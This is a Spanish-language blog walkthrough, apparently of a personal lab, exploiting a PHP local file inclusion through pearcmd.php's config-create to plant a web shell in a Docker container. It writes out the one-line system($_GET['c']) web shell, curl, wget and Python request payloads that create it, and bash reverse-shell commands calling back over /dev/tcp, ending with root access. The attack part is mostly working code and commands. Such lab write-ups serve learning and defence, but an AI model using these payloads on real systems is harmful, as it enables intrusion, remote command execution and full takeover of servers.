+<h2 id="61-comandos-de-sistema">6.1. Comandos de sistema<a href="#61-comandos-de-sistema" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ol start="2">
+<li>Creamos el archivo <em>test.php</em> que ejecuta cualquier comando de sistema a través de una variable &lsquo;c&rsquo;</li>
+</ol>
+<p>En el contenedor, ejecutamos:</p>
+<pre tabindex="0"><code>echo &#34;&lt;?php system(\$_GET[&#39;c&#39;]) ?&gt;&#34;&gt; test.php
+</code></pre><p><img src="media/image44.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.1666666666666667in&rdquo;}</p>
+<p>Obs: hay que escapar el símbolo de pesos con una contrabarra (<em>backslash</em>).</p>
+<p>Ahora hacemos uso del LFI, invocamos al archivo <em>test.php</em>, y a &lsquo;c&rsquo; le damos el valor &lsquo;id&rsquo;:</p>
+<pre tabindex="0"><code>index.php?file=/tmp/test.php&amp;c=id
+</code></pre><p><img src="media/image8.png">{width=&ldquo;6.270833333333333in&rdquo; height=&ldquo;1.343814523184602in&rdquo;}</p>
+<blockquote>
+<p>→ ok, obtenemos el resultado de ejecutar el comando &lsquo;id&rsquo;</p>
+</blockquote>
+<h2 id="62-reverse-shell">6.2. Reverse shell<a href="#62-reverse-shell" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<ol start="3">
+<li>Con lo anterior podemos ejecutar una <em>reverse shell</em> (usando la variable &lsquo;c&rsquo; que espera el archivo <em><strong>test.php</strong></em>)</li>
+</ol>
+<p>En Kali abrimos un <em>listener</em> con <em>nc</em>, y luego la URL a visitar en el navegador es:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?file<span class="o">=</span>/tmp/test.php<span class="p">&amp;</span><span class="nv">c</span><span class="o">=</span>bash -c <span class="se">\&#34;</span>bash -i&gt;%26 /dev/tcp/172.17.0.1/443 0&gt;%261<span class="s2">&#34;
+</span></span></span></code></pre></div><p><img src="media/image28.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.0in&rdquo;}</p>
+<p>Vemos en la imagen anterior que recibimos una conexión entrante en el <em>listener</em>.</p>
+<p>Estamos en el contenedor:</p>
+<p><img src="media/image32.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.75in&rdquo;}</p>
+<h1 id="7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi">7. Repetimos y creamos el archivo ahora haciendo uso del LFI<a href="#7-repetimos-y-creamos-el-archivo-ahora-haciendo-uso-del-lfi" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>Crearemos el archivo en el contenedor usando el LFI que invocará a config-create de pearcmd.php.</p>
+<p>Es decir, ahora queremos hacer lo mismo que hicimos antes, pero:</p>
+<ol>
+<li>
+<p>Utilizando el <em>config-create</em> del pearcmd.php</p>
+</li>
+<li>
+<p>Desde fuera del contenedor</p>
+</li>
+</ol>
+<p>Ahora vamos a escribir un archivo llamado <em>test2.php</em>.</p>
+<p>Tenemos que escribir la cadena:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">system</span><span class="p">(</span><span class="nx">\</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>en el archivo <em>test2.php</em></p>
+
+    <aside class="admonition warning">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle">
+      <circle cx="12" cy="12" r="10"></circle>
+      <line x1="12" y1="8" x2="12" y2="12"></line>
+      <line x1="12" y1="16" x2="12.01" y2="16"></line>
+   </svg></div><b>!!</b>
+        </div>
+        <div class="admonition-content">Si queremos usar el navegador para crear el archivo es posible que nos dé problemas: FAIL</div>
+    </aside>
+<p>Al mandarlo vía la URL del navegador se nos complica, porque los signos de mayor y menor los convierte a código url.</p>
+<p>Algunos intentos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span><span class="se">\$\_</span>GET<span class="se">\[\&#39;</span>c<span class="se">\&#39;\]</span><span class="o">)</span>?<span class="se">\&gt;</span>+/tmp/test2.php
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span>id<span class="o">)</span><span class="p">;</span>?<span class="se">\&gt;</span>+/tmp/test2.php
+</span></span></code></pre></div><p>En el log del servidor web del contenedor, vemos que los símbolos no llegan de forma correcta:</p>
+<p><img src="media/image55.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.375in&rdquo;}</p>
+<h2 id="71-usaremos-curl-para-crear-el-archivo">7.1. Usaremos curl para crear el archivo<a href="#71-usaremos-curl-para-crear-el-archivo" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>En vez de usar el navegador para visitar la URL que usa el <em>config-create</em> y crea el archivo, usemos el comando <em>curl</em>.</p>
+<h3 id="711-primer-test-ejecución-del-comando-id">7.1.1. Primer test, ejecución del comando &lsquo;id&rsquo;<a href="#711-primer-test-ejecución-del-comando-id" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X GET
+</span></span><span class="line"><span class="cl"><span class="se">\&#39;</span>http://127.0.0.1:8000/index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/**<span class="se">\&lt;</span>?<span class="o">=</span>system<span class="o">(</span>id<span class="o">)</span><span class="p">;</span>?<span class="se">\&gt;</span>**+/tmp/test2.php<span class="se">\&#39;</span>
+</span></span></code></pre></div><p><img src="media/image41.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.3611111111111111in&rdquo;}</p>
+<p><img src="media/image34.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.4027777777777777in&rdquo;}</p>
+<p><img src="media/image30.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.25in&rdquo;}</p>
+<p>→ Nos dice que se creó al archivo <em>/tmp/test2.php</em></p>
+<p>En el <em>log</em>, vemos que llega bien (el request, la cadena de texto) al web server del contenedor:</p>
+<p><img src="media/image15.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.2777777777777778in&rdquo;}</p>
+<p>Y si luego solicitamos la URL con el navegador usando <em>file=/tmp/test2.php</em> vemos que se ejecuta de forma correcta y nos da la salida del comando &lsquo;id&rsquo; como esperábamos:</p>
+<p><img src="media/image14.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.8611111111111112in&rdquo;}</p>
+<h3 id="712-hagamos-un-nuevo-archivo-con-parámetro-c">7.1.2. Hagamos un nuevo archivo con parámetro &lsquo;c&rsquo;<a href="#712-hagamos-un-nuevo-archivo-con-parámetro-c" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Podríamos crear el <em>test2.php</em> con el código necesario de una <em>web shell</em>, usando <em>curl</em>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -s -X GET <span class="s1">&#39;http://127.0.0.1:8000/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/\&lt;?=system(\$\_GET\\\[\&#34;c\&#34;\\\])?\&gt;+/tmp/test2.php&#39;</span>
+</span></span></code></pre></div><p><img src="media/image7.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.2777777777777778in&rdquo;}</p>
+<p>Observar que se deben escapar los paréntesis rectos, y además intercambiar las comillas, afuera ponemos las simples y en el <strong>GET</strong> las dobles.</p>
+<p>El <em>log</em> del web server en el contenedor:</p>
+<p><img src="media/image37.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.2638888888888889in&rdquo;}</p>
+<h4 id="7121-ejecución-de-comandos">7.1.2.1. Ejecución de comandos<a href="#7121-ejecución-de-comandos" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>Mediante el LFI, al igual que antes, llamaremos al archivo .php que ya creamos y le daremos en el parámetro &lsquo;c&rsquo; el comando de sistema a ejecutar.</p>
+<p><strong>Comando &lsquo;whoami&rsquo;</strong></p>
+<p><img src="media/image72.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.75in&rdquo;}</p>
+<p>→ ok, hemos ejecutado el comando <em>&lsquo;whoami&rsquo;</em> de forma correcta</p>
+<p><strong>Comando &lsquo;id&rsquo;</strong></p>
+<p><img src="media/image64.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.4861111111111112in&rdquo;}</p>
+<h4 id="7122-reverse-shell">7.1.2.2. Reverse shell<a href="#7122-reverse-shell" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>Ya tenemos el archivo <em>test2.php</em> que mediante la variable &lsquo;c&rsquo; ejecutará un comando de sistema.</p>
+<p>Como comando de sistema ahora podemos incluir el código necesario para que nos devuelva una <em>reverse shell</em>.</p>
+<p>En vez de usar el navegador, podemos llamar usar <em>wget:</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget <span class="se">\&#39;</span>http://127.0.0.1:8000/index.php?file<span class="o">=</span>/tmp/test2.php**<span class="p">&amp;</span><span class="nv">c</span><span class="o">=</span>**bash -c <span class="s2">&#34;bash -i \&gt;%26 /dev/tcp/172.17.0.1/443 0\&gt;%261\&#34;&#39;
+</span></span></span></code></pre></div><p>Al ejecutar el wget:</p>
+<p><img src="media/image68.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.7777777777777778in&rdquo;}</p>
+<p>En el <em>listener</em> recibimos la conexión desde nuestro contenedor de pruebas:</p>
+<p><img src="media/image38.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.2361111111111112in&rdquo;}</p>
+<p>Ya dentro del contenedor podemos realizar el análisis que queramos.</p>
+<p><img src="media/image11.png">{width=&ldquo;5.815553368328959in&rdquo; height=&ldquo;3.526042213473316in&rdquo;}</p>
+<h1 id="8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php">8. Usemos un script python (en vez de curl) para crear el archivo (.php)<a href="#8-usemos-un-script-python-en-vez-de-curl-para-crear-el-archivo-php" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h1>
+<p>La idea es crear un script en Python (hack.py) para hacer el GET request y así crear el archivo de extensión .php (al que luego podremos llamar mediante el LFI).</p>
+<p>Tomaremos el código sugerido en el blog y le consultamos a Chat GPT cómo hacer el <em>request</em> en Python:</p>
+<p><img src="media/image36.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.9583333333333335in&rdquo;}</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GET /index.php?+config-create+/<span class="p">&amp;</span><span class="nv">file</span><span class="o">=</span>/usr/local/lib/php/pearcmd.php<span class="p">&amp;</span>/<span class="se">\&lt;</span>?<span class="o">=</span>phpinfo<span class="o">()</span>?<span class="se">\&gt;</span>+/tmp/hello.php HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.1.162:8080
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: en
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/87.0.4280.88 Safari/537.36
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span></code></pre></div><p><em>&ldquo;Please give me Python syntax to send this raw HTTP request.&rdquo;</em></p>
+<p><img src="media/image13.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;4.763888888888889in&rdquo;}</p>
+<p>Código python sugerido por <em>ChatGPT</em>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s1">&#39;http://192.168.1.162:8080/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/\&lt;?=phpinfo()?\&gt;+/tmp/hello.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s1">&#39;gzip, deflate&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;*/*&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;en&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;User-Agent</span><span class="se">\&#39;</span><span class="s1">: &#39;</span><span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">Windows</span> <span class="n">NT</span> <span class="mf">10.0</span><span class="p">;</span> <span class="n">Win64</span><span class="p">;</span> <span class="n">x64</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">AppleWebKit</span><span class="o">/</span><span class="mf">537.36</span> <span class="p">(</span><span class="n">KHTML</span><span class="p">,</span> <span class="n">like</span> <span class="n">Gecko</span><span class="p">)</span> <span class="n">Chrome</span><span class="o">/</span><span class="mf">87.0.4280.88</span> <span class="n">Safari</span><span class="o">/</span><span class="mf">537.36</span><span class="s1">&#39;,&#39;</span><span class="n">Connection</span><span class="s1">&#39;: &#39;</span><span class="n">close</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span></code></pre></div><p>→ este código será modificado</p>
+<p>Nos hacemos el archivo hack.py con el código sugerido por Chat GPT para ejecutar el GET request con python:</p>
+<p><img src="media/image3.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.3333333333333335in&rdquo;}</p>
+<p>PERO: en vez de escribir el phpinfo() en el /tmp/hello.php
+<img src="media/image60.png">{width=&ldquo;4.057292213473316in&rdquo; height=&ldquo;0.4747889326334208in&rdquo;}</p>
+<p>→ escribimos otro texto para verificar simplemente:</p>
+<p><img src="media/image2.png">{width=&ldquo;5.088542213473316in&rdquo; height=&ldquo;0.47335301837270344in&rdquo;}</p>
+<p>(el signo de + actúa como espacio)</p>
+<h2 id="81-testing-usando-nuestro-hackpy">8.1. Testing usando nuestro hack.py<a href="#81-testing-usando-nuestro-hackpy" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Dentro del contenedor podemos ver que en el /tmp/ no tenemos más que el archivo <em>pear</em>:</p>
+<p><img src="media/image49.png">{width=&ldquo;3.963542213473316in&rdquo; height=&ldquo;0.672230971128609in&rdquo;}</p>
+<p>Si ejecutamos el archivo Python:</p>
+<pre tabindex="0"><code>python3 hack.py
+</code></pre><p>Vemos que en el log se vé el GET:</p>
+<p><img src="media/image59.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.4583333333333333in&rdquo;}</p>
+<p>Y si revisamos el contenido del directorio /tmp:</p>
+<p><img src="media/image39.png">{width=&ldquo;4.296875546806649in&rdquo; height=&ldquo;1.232024278215223in&rdquo;}</p>
+<p>→ Se creó el <strong>hello.php</strong> que ahora podremos invocar usando nuestro LFI
+→ se ejecutará (se interpreta) pues es un .php</p>
+<p><img src="media/image10.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.9722222222222222in&rdquo;}</p>
+<p>En este caso tiene un error en el echo, igualmente vemos que sí se ejecutó bien.</p>
+<h2 id="82-ejecución-remota-de-comandos">8.2. Ejecución remota de comandos<a href="#82-ejecución-remota-de-comandos" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h2>
+<p>Podemos modificar el hack.py para que ejecute un comando de sistema, que se lo pasaremos en la URL mediante una variable &lsquo;c&rsquo;:</p>
+<p><img src="media/image20.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.263888888888889in&rdquo;}</p>
+<p>Lo ejecutamos de nuevo para generar un nuevo <em>hello.php</em>:</p>
+<pre tabindex="0"><code>python3 hack.py
+</code></pre><p>Volvemos a listar en el contenedor en el /tmp:</p>
+<p><img src="media/image71.png">{width=&ldquo;4.713542213473316in&rdquo; height=&ldquo;0.4614654418197725in&rdquo;}</p>
+<p>Si le hacemos un <strong>cat</strong> al <strong>hello.php</strong>:</p>
+<p><img src="media/image56.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.3194444444444444in&rdquo;}</p>
+<p>Y si vamos al navegador, veremos:</p>
+<p><img src="media/image61.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.7222222222222222in&rdquo;}</p>
+<p>Tenemos un <strong>Warning</strong> pues no le hemos pasado el valor, es decir el comando, a la variable &lsquo;c&rsquo;:</p>
+<h3 id="821-ejecutemos-el-comando-id">8.2.1. Ejecutemos el comando id<a href="#821-ejecutemos-el-comando-id" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>En la url tenemos que usar el LFI para invocar al archivo <strong>hello.php</strong>.</p>
+<pre tabindex="0"><code>http://localhost:8000/?file=/tmp/hello.php&amp;c=id
+</code></pre><p><img src="media/image33.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.6666666666666666in&rdquo;}</p>
+<p>Ya tenemos ejecución de comandos y si queremos podemos ejecutar <em>una reverse shell</em>.</p>
+<h3 id="822-ganar-acceso">8.2.2. Ganar acceso<a href="#822-ganar-acceso" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h3>
+<p>Nuestra IP de Docker:</p>
+<p><img src="media/image48.png">{width=&ldquo;3.401042213473316in&rdquo; height=&ldquo;0.9051159230096238in&rdquo;}</p>
+<p>Vamos a la web de revshells.com</p>
+<p><img src="media/image42.png">{width=&ldquo;5.296875546806649in&rdquo; height=&ldquo;3.862671697287839in&rdquo;}</p>
+<p>Vamos a copiar esa cadena con el comando, la ejecutaremos con bash pero se la daremos codificada en base64:</p>
+<p><img src="media/image47.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;1.0416666666666667in&rdquo;}</p>
+<p>Listener con netcat en el puerto 8888:</p>
+<p><img src="media/image73.png">{width=&ldquo;2.6406255468066493in&rdquo; height=&ldquo;0.7109372265966755in&rdquo;}</p>
+<h4 id="8221-reverse-shell-en-el-hackpy">8.2.2.1. Reverse shell en el hack.py<a href="#8221-reverse-shell-en-el-hackpy" class="anchor" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 7h3a5 5 0 0 1 5 5 5 5 0 0 1-5 5h-3m-6 0H6a5 5 0 0 1-5-5 5 5 0 0 1 5-5h3"></path><line x1="8" y1="12" x2="16" y2="12"></line></svg></a></h4>
+<p>Nos copiamos el código en base64 para tenerlo guardado, o a la vista:</p>
+<p><img src="media/image25.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.5277777777777778in&rdquo;}</p>
+<p>Creamos una nueva conexión:</p>
+<p><img src="media/image35.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;2.236111111111111in&rdquo;}</p>
+<p>Ejecutamos de nuevo el hack.py</p>
+<p><img src="media/image52.png">{width=&ldquo;2.4114588801399823in&rdquo; height=&ldquo;0.48229221347331586in&rdquo;}</p>
+<p>pero da un error</p>
+<p><img src="media/image63.png">{width=&ldquo;5.390625546806649in&rdquo; height=&ldquo;0.9760433070866141in&rdquo;}</p>
+<p>→ al parecer no le gustan los espacios</p>
+<p>Prueba con un &lsquo;+&rsquo; para evitar el espacio en blanco pero tampoco funciona</p>
+<p><img src="media/image18.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.6666666666666666in&rdquo;}</p>
+<p>→ vamos a hacerlo con urlencode; importamos la librería <em>urllib.parse</em></p>
+<p><img src="media/image65.png">{width=&ldquo;3.026042213473316in&rdquo; height=&ldquo;1.2087937445319334in&rdquo;}</p>
+<p><img src="media/image57.png">{width=&ldquo;6.267716535433071in&rdquo; height=&ldquo;0.6527777777777778in&rdquo;}</p>
+<p>Ejecutamos de nuevo el <strong>hack.py</strong> y recibimos la reverse shell:</p>
+<p><img src="media/image26.png">{width=&ldquo;3.369792213473316in&rdquo; height=&ldquo;1.618561898512686in&rdquo;}</p>
+<p>Somos root:</p>
+<p><img src="media/image50.png">{width=&ldquo;4.421875546806649in&rdquo; height=&ldquo;0.5537828083989501in&rdquo;}</p>
+<p><img src="media/image54.png">{width=&ldquo;4.380208880139983in&rdquo; height=&ldquo;1.3986515748031496in&rdquo;}</p>
+<div class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1">
+<p>Youtube: <em><a href="https://www.youtube.com/watch?v=yq2rq50IMSQ&t=235s">John Hammond Youtube video</a></em>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</div>
 
 			</div>
 			<div class="human posts"><a href="https://brainmade.org/" target="_blank" rel="external noreferrer noopener"><abbr title="No odio a las IA; ¡pero amo a los humanos!"><svg fill="#fff" width="128" height="40" viewBox="0 0 128 40" xmlns="http://www.w3.org/2000/svg">
@@ -229,8 +660,78 @@
          d="M20.186 29.111v-9.644c.059 0 .118.009.177.009 4.885-.006 8.525-4.506 7.511-9.284a1.19 1.19 0 0 0-.911-.911 7.67 7.67 0 0 0-9.049 5.67l-.033-.036a7.66 7.66 0 0 0-7.03-2.085 1.19 1.19 0 0 0-.911.91c-1.014 4.777 2.627 9.277 7.51 9.284.118 0 .246-.014.369-.02v6.106zm1.419-16.072a5.33 5.33 0 0 1 4.062-1.553 5.33 5.33 0 0 1-5.614 5.615 5.3 5.3 0 0 1 1.552-4.061zm-7.904 6.057a5.3 5.3 0 0 1-1.559-4.061 5.323 5.323 0 0 1 5.614 5.615 5.3 5.3 0 0 1-4.055-1.554m38.419-6.79q0 2.346-1.567 3.63-1.567 1.282-4.351 1.283h-7.669V0h7.016q2.807 0 4.242 1.1 1.446 1.087 1.446 3.226 0 1.467-.729 2.481-.718 1.002-2.197 1.357 1.86.244 2.828 1.32.979 1.063.979 2.823zm-4.112-7.491q0-1.161-.663-1.65-.652-.488-1.947-.488h-3.655v4.265h3.677q1.36 0 1.968-.525.62-.537.62-1.601m.892 7.209q0-2.42-3.089-2.42h-4.069v4.938h4.188q1.545 0 2.252-.624.718-.635.718-1.894m16.26 5.194-3.557-6.538h-3.764v6.538H54.63V0h7.658q2.741 0 4.231 1.332 1.49 1.32 1.49 3.8 0 1.808-.913 3.128-.914 1.308-2.47 1.723l4.144 7.235zm-.381-11.94q0-2.481-2.828-2.481h-4.112v5.083h4.199q1.349 0 2.045-.684.696-.685.696-1.919m16.785 11.94-1.36-4.399h-5.841l-1.359 4.399h-3.209L75.386 0h3.785l5.569 17.219zM77.278 2.651l-.066.269q-.109.44-.261 1.002c-.152.563-.725 2.436-1.871 6.184h4.405l-1.512-4.949-.468-1.662zm9.551 14.567V0h3.209v17.219zm15.53 0L95.681 3.959q.196 1.931.196 3.104v10.155h-2.849V0h3.666l6.777 13.37q-.196-1.846-.196-3.361V0h2.85v17.219zM52.63 39.375V28.331q.011-.351.115-3.015-.818 3.257-1.209 4.541l-2.925 9.518h-2.418l-2.925-9.518-1.232-4.541q.139 2.809.139 3.717v10.342h-3.017V22.313h4.548l2.902 9.543.253.92.553 